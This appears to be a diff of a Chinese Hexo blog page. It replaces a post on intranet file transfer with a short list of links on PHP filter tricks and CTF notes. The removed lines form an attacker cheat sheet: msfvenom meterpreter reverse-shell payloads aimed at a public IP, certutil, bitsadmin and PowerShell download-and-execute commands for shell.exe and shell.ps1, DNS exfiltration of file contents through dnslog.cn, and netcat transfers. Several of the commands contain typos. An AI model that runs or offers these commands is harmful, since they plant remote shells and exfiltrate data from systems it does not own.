@@ -7,10 +7,10 @@
 
     
 
-    <title>内网文件传输 | Hexo</title>
+    <title>攻防世界 file_include | Hexo</title>
     <meta name="author" content="John Doe" />
     <meta name="keywords" content="" />
-    <meta name="description" content="windowsFTP攻击机：python快速开启ftp服务器 | 目标机：                               | 保存为文件ftp.txt,执行pip3 install pyftpdlib         copy coon ftp.txt           ftp -i -s:ftp.txt                               open 192.168.1.227 2121                               anon" />
+    <meta name="description" content="转换过滤器：https://www.php.net/manual/zh/mbstring.supported-encodings.php详解php:&amp;#x2F;&amp;#x2F;filter以及死亡绕过：https://blog.csdn.net/woshilnp/article/details/117266628详解php:&amp;#x2F;&amp;#x2F;filter以及死亡绕过：https://blog.csdn.net/qq_44657899/article/details/109300335CTF—w" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
 
@@ -94,7 +94,7 @@
         
 
         
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows"><span class="toc-number">1.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">脚本语言</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">转换过滤器：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3php-x2F-x2F-filter%E4%BB%A5%E5%8F%8A%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">详解php:&#x2F;&#x2F;filter以及死亡绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3php-x2F-x2F-filter%E4%BB%A5%E5%8F%8A%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87%EF%BC%9A-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">详解php:&#x2F;&#x2F;filter以及死亡绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF%E2%80%94web%E9%A2%98%E5%BA%93%E7%AC%94%E8%AE%B0%EF%BC%9A"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">CTF—web题库笔记：</span></a></li></ol></li></ol></li></ol></li></ol>
         
     </div>
 </aside>
@@ -108,15 +108,15 @@
     <header class="article-header">
         
         <h1 itemprop="name">
-            内网文件传输
+            攻防世界 file_include
         </h1>
         
         <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/index.html">
+            <a class="article-date" href="http://example.com/2023/09/05/%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8/index.html">
     
     <i class="icon-calendar vm"></i>
     
-    <time class="vm" datetime="2023-08-20T11:17:29.000Z" itemprop="datePublished">2023-08-20</time>
+    <time class="vm" datetime="2023-09-05T06:49:19.000Z" itemprop="datePublished">2023-09-05</time>
 </a>
 
             
@@ -126,55 +126,10 @@
     
     <section class="article-body markdown-body">
         
-        <h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><ol>
-<li>FTP<br>攻击机：python快速开启ftp服务器 | 目标机：                               | 保存为文件ftp.txt,执行</li>
-</ol>
-<p>pip3 install pyftpdlib         copy coon ftp.txt           ftp -i -s:ftp.txt<br>                               open 192.168.1.227 2121<br>                               anonymoous<br>                               anonymoous<br>                               get msftest.apk<br>                               quit<br>python3 -m pyftpdlib<br>2. Bitsadmin<br>BITSAdmin是一个命令行工具，您可以使用它创建下载或上载作业，并监视其进度。<br>msfvenom -p windows&#x2F;x64&#x2F;meteerpreter&#x2F;reverse_tcp ihost&#x3D;139.155.49.43 iport&#x3D;7777 -f hta-psh 44.hta</p>
-<p>bitsadmin &#x2F;transfer shell <a target="_blank" rel="noopener" href="http://139.155.49.43/">http://139.155.49.43</a> &#x2F;44.hta C:\windows\temp\44.hta</p>
-<p>rundll32.exe url.dll,OpenURL 44.hta</p>
-<ol start="3">
-<li>Certutil</li>
-</ol>
-<ul>
-<li><p>下载并执行<br>certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.227:8000/shell.exe">http://192.168.1.227:8000/shell.exe</a> &amp; shell.exe</p>
-</li>
-<li><p>清除下载缓存<br>certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.227:8000/shell.exe">http://192.168.1.227:8000/shell.exe</a> delete</p>
-</li>
-</ul>
-<p>缓存目录：%USERPROFILE%\AppData\Locailow\Microsoft\CryptnetUrlCache\Content</p>
-<ol start="4">
-<li>Powereshell<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;139.155.49.43 lport&#x3D;8899 -f psh-r o shell.ps1</li>
-</ol>
-<p>powershell -windowstyle hidden -exec bypass -c “IEX (New-ObjectNet.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://139.155.49.43/shell.ps1');shell.ps1">http://139.155.49.43/shell.ps1&#39;);shell.ps1</a>“;</p>
-<ol start="5">
-<li>SCP</li>
-</ol>
-<ul>
-<li>SCP上传文件<br>scp win.vbs <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#x2e;&#x32;&#x32;&#55;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#x2e;&#x32;&#x32;&#55;</a>:&#x2F;tmp&#x2F;win<br>scp -r win&#x2F;<a href="mailto:&#x72;&#x6f;&#111;&#x74;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#46;&#50;&#50;&#55;">&#x72;&#x6f;&#111;&#x74;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#46;&#50;&#50;&#55;</a>:&#x2F;tmp&#x2F;win&#x2F;</li>
-<li>SCP下载文件<br>scp <a href="mailto:&#114;&#111;&#111;&#x74;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#x32;&#55;">&#114;&#111;&#111;&#x74;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#x32;&#55;</a>:&#x2F;root&#x2F;ftp123 ftp123<br>scp -r linux&#x2F; <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x2e;&#x32;&#50;&#x37;">&#x72;&#111;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x2e;&#x32;&#50;&#x37;</a>:&#x2F;root&#x2F;linux&#x2F;</li>
-</ul>
-<ol start="6">
-<li>windows文件共享</li>
-</ol>
-<ul>
-<li>Net use<br>net uses k:\192.168.78.67\c$ “123123” &#x2F;user:administrator</li>
-</ul>
-<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ol>
-<li>wget<br>wget命令用来从指定得URL下载文件<br>wget <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a><br>wget -O x.sh <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a></li>
-<li>Curl<br>curl是用来请求web服务器得命令工具。<br>curl -o lan.hta <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a><br>curl -0 <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a></li>
-<li>Netcat<br>cat file | nc -l 1234<br>nc host_ip 1234 &gt; file<br>nc host_ip 1234 &lt; file<br>nc -lvvp 1234 &gt; file</li>
-</ol>
-<h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><p>DNS传输数据<br>cat test | xxd -p -c 16 | while read line;do host $line.sau547.dnslog.cn;done</p>
-<ol>
-<li><p>PHP<br>php -r ‘file_put_contents(“lan.hta”,file_get_contents(“<a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a>“));’<br>file_put_contents——将一个字符串写入文件<br>file_get_contents——将整个文件读入一个字符串</p>
-</li>
-<li><p>Python<br>python3-c “import<br>urllib.request;u&#x3D;urllib.request.urlopen(‘<a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta');f=open">http://192.168.1.227/lan.hta&#39;);f=open</a>(‘c:\temp\win.hta’,w ite(u.read().deconde(‘utf-8’))</p>
-</li>
-<li><p>Perl<br>perl -MLWP::Simple -e ‘getstore (“<a target="_blank" rel="noopener" href="http://192.168.1.227/Launcher.hta%22,%22win.hta">http://192.168.1.227/Launcher.hta&quot;,&quot;win.hta</a>“)’</p>
-</li>
-<li><p>Ruby</p>
-</li>
-</ol>
+        <h1 id="转换过滤器："><a href="#转换过滤器：" class="headerlink" title="转换过滤器："></a>转换过滤器：</h1><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
+<h2 id="详解php-x2F-x2F-filter以及死亡绕过："><a href="#详解php-x2F-x2F-filter以及死亡绕过：" class="headerlink" title="详解php:&#x2F;&#x2F;filter以及死亡绕过："></a>详解php:&#x2F;&#x2F;filter以及死亡绕过：</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p>
+<h3 id="详解php-x2F-x2F-filter以及死亡绕过：-1"><a href="#详解php-x2F-x2F-filter以及死亡绕过：-1" class="headerlink" title="详解php:&#x2F;&#x2F;filter以及死亡绕过："></a>详解php:&#x2F;&#x2F;filter以及死亡绕过：</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109300335">https://blog.csdn.net/qq_44657899/article/details/109300335</a></p>
+<h4 id="CTF—web题库笔记："><a href="#CTF—web题库笔记：" class="headerlink" title="CTF—web题库笔记："></a>CTF—web题库笔记：</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cocoaiu/article/details/126319957">https://blog.csdn.net/cocoaiu/article/details/126319957</a></p>
 
         
     </section>
@@ -192,10 +147,10 @@
         repo: "sanonz.github.io",
         owner: "sanonz",
         admin: ["sanonz"],
-        id: "16ec392738f6e8569d40a85d67c55cec",
+        id: "807488cdd53626570adb713a1373e3d1",
         distractionFreeMode: true,
-        title: "内网文件传输",
-        body: "http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/",
+        title: "攻防世界 file_include",
+        body: "http://example.com/2023/09/05/%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8/",
         labels: []
     }).render('comments');
     </script>
@@ -208,10 +163,8 @@
 
         
             
-            <a id="pagenext" href="/2023/08/19/linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-next" title="linux主机信息收集"><i class="icon-arrow-right"></i></a>
+            <a id="pagenext" href="/2023/09/05/Linux%E5%AD%A6%E4%B9%A0/" class="article-next" title="Linux学习"><i class="icon-arrow-right"></i></a>
             
-            
-            <a id="pageprev" href="/2023/09/05/Linux%E5%AD%A6%E4%B9%A0/" class="article-prev" title="Linux学习"><i class="icon-arrow-left"></i></a>
             
         
 
